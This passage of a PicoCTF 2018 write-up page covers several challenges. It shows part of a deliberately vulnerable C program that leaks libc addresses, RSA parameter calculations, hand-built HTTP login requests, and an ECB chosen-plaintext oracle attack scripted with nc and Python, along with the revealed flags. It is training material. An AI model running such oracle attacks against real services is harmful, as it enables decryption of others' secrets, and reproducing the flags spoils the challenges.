  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Thanks! Exiting now..."</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Set the gid to the effective gid</span>
  <span class="c1">// this prevents /bin/sh from dropping the privileges</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>


  <span class="n">puts</span><span class="p">(</span><span class="s">"Here are some useful addresses:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"puts: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">puts</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"fflush %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fflush</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"read: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">read</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"write: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">write</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"useful_string: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">useful_string</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">vuln</span><span class="p">();</span>


  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="cryptography-250-rsa-madlibs"> Cryptography 250: rsa-madlibs <a href="/CTF-writeups-public/writeups/PicoCTF_2018/58-cryptography-250-rsa-madlibs.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We ran into some weird puzzles we think may mean something, can you help me solve one?</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 40440</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect and are asked to do some RSA calculations. We get some parameters, and have to calculate a target RSA parameter, or answer that it is not feasible to do so. The complete exchange went as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre><td class="rouge-code"><pre>Hello, Welcome to RSA Madlibs
Keeping young children entertained, since, well, nev3r
Tell us how to fill in the blanks, or if it's even possible to do so
Everything, input and output, is decimal, not hex
#### NEW MADLIB ####
q : 93187
p : 94603
##### WE'RE GONNA NEED THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO FILL IN THE MADLIB! ###
n: 8815769761
YAHHH! That one was a great madlib!!!


#### NEW MADLIB ####
p : 81203
n : 6315400919
##### WE'RE GONNA NEED THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO FILL IN THE MADLIB! ###
q: 77773
YAHHH! That one was a great madlib!!!


#### NEW MADLIB ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### WE'RE GONNA NEED THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
YAHHH! That one was a great madlib!!!


#### NEW MADLIB ####
q : 78203
p : 79999
##### WE'RE GONNA NEED THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO FILL IN THE MADLIB! ###
totient(n): 6256003596
YAHHH! That one was a great madlib!!!


#### NEW MADLIB ####
plaintext : 1815907181716474805136452061793917684000871911998851410864797078911161933431337632774829806207517001958179617856720738101327521552576351369691667910371502971480153619360010341709624631317220940851114914911751279825748
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### WE'RE GONNA NEED THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
#### TIME TO FILL IN THE MADLIB! ###
ciphertext: 26722917505435451150596710555980625220524134812001687080485341361511207096550823814926607028717403343344600191255790864873639087129323153797404989216681535785492257030896045464472300400447688001563694767148451912130180323038978568872458130612657140514751874493071944456290959151981399532582347021031424096175747508579453024891862161356081561032045394147561900547733602483979861042957169820579569242714893461713308057915755735700329990893197650028440038700231719057433874201113850357283873424698585951160069976869223244147124759020366717935504226979456299659682165757462057188430539271285705680101066120475874786208053
YAHHH! That one was a great madlib!!!

#### NEW MADLIB ####
ciphertext : 10752401345107934853994451075614360420392571726218503379932844501179276054552894499371978339254216342863717232351225262
456711111066616866474311520379151098570994236660962643699588778167465127223356630381497967750710116858773937569900973458898548236970
2634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785
820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767
742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813
499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834
139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### WE'RE GONNA NEED THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):N
YAHHH! That one was a great madlib!!!

#### NEW MADLIB ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### WE'RE GONNA NEED THE FOLLOWING ####
d
IS THIS POSSIBLE and FEASIBLE? (Y/N): Y
#### TIME TO FILL IN THE MADLIB! ###
d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729

YAHHH! That one was a great madlib!!!


#### NEW MADLIB ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext :
5315135537182226856134532843338546481354659841681272223692273789930341302489189252395544040217036010025492161730920090820789264419456405499853943420863961834511620167348215712366219204972198527365477630427263725627920265227612760416678425823843187407675643742844283110052895704455415142735463486037912801307917634230788549540802477270278755052542590491708620341889689884020271200598596327430790861785538107067664504281508756159305916221674161062222221931717498244841323828452111473034440447694160917521358885718436832783214139059379459896493819067235346238816701274408935126796953373891399167497687512301978797146598
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### WE'RE GONNA NEED THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N): Y
#### TIME TO FILL IN THE MADLIB! ###
plaintext: 240109877286251840533272915662757983981706320845661471802585807564915966910384301849411666983334013


plaintext: YAHHH! That one was a great madlib!!!


If you convert the last plaintext to a hex number, then ascii, you'll find what you're searching for ;)
</pre></table></code></div></div><p>so we convert the last answer to the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>&gt;&gt;&gt; flag = 240109877286251840533272915662757983981706320845661471802585807564915966910384301849411666983334013
&gt;&gt;&gt; hex(flag)
'0x7069636f4354467b64305f755f6b6e30775f7468335f7740795f325f5253405f35643338336531307d'
&gt;&gt;&gt; bytes.fromhex(hex(flag)[2:]).decode('utf-8')
'picoCTF{d0_u_kn0w_th3_w@y_2_RS@_5d383e10}'
</pre></table></code></div></div><p>Below is some pseudocode of how parameters may be calculated given a set of<br /> other ones</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1"># pseudocode to show how the rsa calculations were done
</span><span class="kn">import</span> <span class="n">gmpy2</span>

<span class="n">N</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="n">q</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span><span class="n">p</span>

<span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">r</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">r</span><span class="p">)</span>

<span class="n">ct</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">powmod</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">powmod</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>
</pre></table></code></div></div><p>all responses can be found in <a href="writeupfiles/madlibs_answers.txt">madlibs_answers.txt</a> and run with</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat madlib_aswers.txt | nc 2018shell1.picoctf.com 40440
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{d0_u_kn0w_th3_w@y_2_RS@_5d383e10} </code><hr><h1 id="reversing-275-be-quick-or-be-dead-2"> Reversing 275: be-quick-or-be-dead-2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/59-reversing-275-be-quick-or-be-dead-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> As you enjoy <a href="https://www.youtube.com/watch?v=CTt1vk9nM9c">this music</a> even more, another executable <a href="./writeupfiles/be-quick-or-be-dead-2">be-quick-or-be-dead-2</a> shows up.</p><p>Can you run this fast enough too? You can also find the executable in /problems/be-quick-or-be-dead-2_4_aeb39eed03c948aec1bf7fa3d03dad0c.</p><h2 id="hints"><span class="mr-2">Hints</span><a href="#hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Can you call stuff without executing the entire program?<li>What will the key finally be?</ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="general-skills-275-in-out-error"> General Skills 275: in out error <a href="/CTF-writeups-public/writeups/PicoCTF_2018/60-general-skills-275-in-out-error.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you utlize stdin, stdout, and stderr to get the flag from this program?<br /> You can also find it in <code class="language-plaintext highlighter-rouge">/problems/in-out-error_2_c33e2a987fbd0f75e78481b14bfd15f4</code> on the shell server</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>log into shell and:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo "Please may I have the flag?" | ./in-out-error | grep picoCTF
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{p1p1ng_1S_4_7h1ng_b6f5a788} </code><hr><h1 id="web-exploitation-300-artisinal-handcrafted-http-3"> Web Exploitation 300: Artisinal Handcrafted HTTP 3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/61-web-exploitation-300-artisinal-handcrafted-http-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We found a hidden flag server hiding behind a proxy, but the proxy has some… <em>interesting</em> ideas of what qualifies someone to make HTTP requests. Looks like you’ll have to do this one by hand.</p><p>Try connecting via <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 26431</code>, and use the proxy to send HTTP requests to <code class="language-plaintext highlighter-rouge">flag.local</code>. We’ve also recovered a username and a password for you to use on the login page: <code class="language-plaintext highlighter-rouge">realbusinessuser</code>/<code class="language-plaintext highlighter-rouge">potoooooooo</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>GET /
Host: flag.local

HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 321
etag: W/"141-LuTf9ny9p1l454tuA3Un+gDFLWo"
date: Sat, 06 Oct 2018 16:53:46 GMT
connection: close

&lt;snip&gt;
/login
</pre></table></code></div></div><p>So we access login:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>GET /login
Host: flag.local

HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 498
etag: W/"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"
date: Sat, 06 Oct 2018 16:54:08 GMT
connection: close


                &lt;html&gt;
                        &lt;head&gt;
                                &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;
                        &lt;/head&gt;
                        &lt;body&gt;
                                &lt;header&gt;
                                        &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;
                                        &lt;a href="/login"&gt;Login&lt;/a&gt;
                                &lt;/header&gt;
                                &lt;main&gt;
                                        &lt;h2&gt;Log In&lt;/h2&gt;

                                        &lt;form method="POST" action="login"&gt;
                                                &lt;input type="text" name="user" placeholder="Username" /&gt;
                                                &lt;input type="password" name="pass" placeholder="Password" /&gt;
                                                &lt;input type="submit" /&gt;
                                        &lt;/form&gt;
                                &lt;/main&gt;
                        &lt;/body&gt;
                &lt;/html&gt;
</pre></table></code></div></div><p>So let’s post the user/pass to that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>POST /login
Host: flag.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

user=realbusinessuser&amp;pass=potoooooooo
HTTP/1.1 302 Found
x-powered-by: Express
set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
location: /
vary: Accept
content-type: text/plain; charset=utf-8
content-length: 23
date: Sat, 06 Oct 2018 16:59:49 GMT
connection: close

Found. Redirecting to /%
</pre></table></code></div></div><p>And let’s fetch index with that cookie:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>GET /
Host: flag.local
Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D

HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 438
etag: W/"1b6-W7vAFWOkYXQgrhkzGj6dgZ9sfsg"
date: Sat, 06 Oct 2018 17:01:15 GMT
connection: close

&lt;snip&gt;
&lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2}&lt;/code&gt;.&lt;/p&gt;
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2} </code><hr><h1 id="cryptography-300-spyfi"> Cryptography 300: SpyFi <a href="/CTF-writeups-public/writeups/PicoCTF_2018/62-cryptography-300-spyfi.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> James Brahm, James Bond’s less-franchised cousin, has left his secure communication with HQ running, but we couldn’t find a way to steal his agent identification code. Can you? Conect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 31123</code>. <a href="writeupfiles/spy_terminal_no_flag.py">Source.</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When we connect, we are asked for our situation report, and are given and encrypted string (different depending on our input)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 31123
Welcome, Agent 006!
Please enter your situation report: bla
4d6276d172d79a9b7da9098f69e9b403024a64082b1f2cdfa32d27d78ca83236e30cf5302c3f000ff2cb7b8a7106351c3fbf30cac64b016bb3fd112a28ed5478da62ea7c24a6c2956c96fbaaa3097dee75e268403189f06f1250226d6d557f9dcbadccc3485faa80ca8c04ff845819b5fb49b0414a48d3cb4993e15d5c9a05a7935360d079133605136cd91c3a85559adf26219527ad17f80a6fece062d71d6f

<span class="nv">$ </span>nc 2018shell1.picoctf.com 31123
Welcome, Agent 006!
Please enter your situation report: zzzzzzzzzzzzzzz
4d6276d172d79a9b7da9098f69e9b403024a64082b1f2cdfa32d27d78ca83236e30cf5302c3f000ff2cb7b8a7106351cc71a0b099baa79288b88380b6e1176093062f7a7751b1cd658a5bd1068c1e66da61b6aa76648777223b15da96a1f249e4ea96647c833ab65e5ec4ed409fe3414af4759f13ad15cc038b0084cdd2f7440456b962fdff9ae64e7a083561b1fda1a8e456864e71843a630207321a2728d26d94dd9b0159dce7368382298d639b818
</pre></table></code></div></div><p>Looks like the beginning is always the same.. After some experimentation, 11z’s pads the first bit of text nicely to 64 characters, then every other section are 16 character sections.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>$ python -c 'print("z" * 11 + "a" * 64 + "b" * 64)' | nc 2018shell1.picoctf.com 31123 | sed 's/Please enter your situation report: //g' | fold -w 32
Welcome, Agent 006!
4d6276d172d79a9b7da9098f69e9b403
024a64082b1f2cdfa32d27d78ca83236
e30cf5302c3f000ff2cb7b8a7106351c
c71a0b099baa79288b88380b6e117609
99908ad37adef3fb5a94680c5a64c6ca # aaaaaaaaaaaaaaaa
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
5e6605d02027026603b6f00863d32bc5 # bbbbbbbbbbbbbbbb
5e6605d02027026603b6f00863d32bc5
5e6605d02027026603b6f00863d32bc5
5e6605d02027026603b6f00863d32bc5
843f702396b187b716fdfd818e0ebff1
20de53dad133d6a28195473711d21861
7577b2866bbc75dcb721fc57c1cc51ad
ad9aa6494e74fdfa8d484b6a0a895ea6
30ad4028ee72122451ffdbdad0e04c37
efc6c5598b5e33fee6d2c043ed8032e7
292a0b28f8fb2f711e633fd63f526f09
</pre></table></code></div></div><p>So obviously prefixed/postfixed with something and we’ll need to figure out the contents. Using <code class="language-plaintext highlighter-rouge">$</code> for newline, we can get this mapping</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Agent,$Greetings   4d6276d172d79a9b7da9098f69e9b403
. My situation r   024a64082b1f2cdfa32d27d78ca83236
eport is as foll   e30cf5302c3f000ff2cb7b8a7106351c
ows:$zzzzzzzzzzz   c71a0b099baa79288b88380b6e117609
</pre></table></code></div></div><p>And that means the end parts maps:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>----------------   ================================

$My agent identi   843f702396b187b716fdfd818e0ebff1
fying code is: ?   20de53dad133d6a28195473711d21861
????????????????   7577b2866bbc75dcb721fc57c1cc51ad
????????????????   ad9aa6494e74fdfa8d484b6a0a895ea6
.$Down with the    30ad4028ee72122451ffdbdad0e04c37
Soviets,$006$000   efc6c5598b5e33fee6d2c043ed8032e7
</pre></table></code></div></div><p>Making a total guess about the last line. So let’s see if we can find the right<br /> number of 0s to pad with.</p><p>Let’s at least confirm we’re on the right path?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>$ python -c 'print("z" * 11 + "a" * 64 +  "fying code is: p" +"a" * 64)' | nc 2018shell1.picoctf.com 31123 | sed 's/Please enter your situation report: //g' | fold -w 32
Welcome, Agent 006!
4d6276d172d79a9b7da9098f69e9b403
024a64082b1f2cdfa32d27d78ca83236
e30cf5302c3f000ff2cb7b8a7106351c
c71a0b099baa79288b88380b6e117609
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
20de53dad133d6a28195473711d21861 # fying code is: p
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
99908ad37adef3fb5a94680c5a64c6ca
843f702396b187b716fdfd818e0ebff1
20de53dad133d6a28195473711d21861 # MATCH!!!!
7577b2866bbc75dcb721fc57c1cc51ad
ad9aa6494e74fdfa8d484b6a0a895ea6
30ad4028ee72122451ffdbdad0e04c37
efc6c5598b5e33fee6d2c043ed8032e7
292a0b28f8fb2f711e633fd63f526f09
</pre></table></code></div></div><p>So now we need to push it around so we can guess the characters in the middle<br /> and check against the hash lower down.</p><p>This was semi-automated in</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
    <span class="n">nc</span> <span class="o">=</span> <span class="nc">Netcat</span><span class="p">(</span><span class="sh">'</span><span class="s">2018shell1.picoctf.com</span><span class="sh">'</span><span class="p">,</span> <span class="mi">31123</span><span class="p">)</span>
    <span class="n">nc</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span> <span class="c1"># Hello
</span>    <span class="n">nc</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span> <span class="c1"># enter report
